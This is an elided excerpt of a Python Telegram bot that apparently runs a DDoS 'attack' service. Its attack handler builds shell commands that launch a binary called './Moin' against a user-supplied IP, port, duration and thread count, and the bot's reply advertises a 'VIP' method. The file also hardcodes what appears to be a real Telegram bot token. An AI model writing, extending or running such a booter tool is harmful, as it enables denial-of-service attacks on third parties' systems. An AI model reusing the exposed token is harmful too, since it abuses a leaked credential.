...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7850332533:AAEXNz67Eh0pqbrM8RpS9Yt_KRndzVgjx44'
...
def get_dynamic_user():
    try:
        ...
        return os.environ.get('USER') or os.environ.get('LOGNAME') or 'unknown_user'

USER_NAME = get_dynamic_user()
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        isagi_command = f"./Moin {ip} {port} {duration}"
    elif argument_type == 4:
        isagi_command = f"./Moin {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        isagi_command = f"./Moin {ip} {port} {duration} {byte_size} {threads}"
    ...
    await context.bot.send_message(chat_id=chat_id, text=( 
        ...
        f"* METHOD VIP USER OF :@LASTWISHES0*"
    ), parse_mode='Markdown')
